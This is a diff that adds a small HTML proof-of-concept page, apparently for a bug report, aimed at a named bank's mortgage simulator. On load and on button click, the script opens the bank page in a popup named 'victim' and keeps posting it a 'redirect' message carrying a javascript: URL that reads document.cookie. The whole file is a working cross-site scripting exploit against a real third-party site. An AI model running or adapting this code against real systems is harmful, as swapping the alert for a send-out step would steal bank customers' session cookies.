@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Start Simulator</title>
+</head>
+<body>
+
+<button id="go">Start Simulator</button>
+
+<script>
+let interval = null;
+
+function startSimulator() {
+  const w = window.open(
+    'https://www.caixabank.es/apl/hipotecas/simulador/index_es.html',
+    'victim',
+    'width=1000,height=800'
+  );
+
+  if (!w) {
+    alert('Popup blocked. Please allow popups and try again.');
+    return;
+  }
+
+  const payload = {
+    type: 'redirect',
+    url: 'javascript:alert(document.cookie)'
+  };
+
+  if (interval) clearInterval(interval);
+
+  interval = setInterval(function () {
+    if (w.closed) {
+      clearInterval(interval);
+      interval = null;
+      return;
+    }
+
+    w.postMessage(payload, '*');
+  }, 300);
+}
+
+// Attempt automatic launch
+window.addEventListener('load', function () {
+  startSimulator();
+});
+
+// Manual fallback
+document.getElementById('go').addEventListener('click', function () {
+  startSimulator();
+});
+</script>
+
+</body>
+</html>
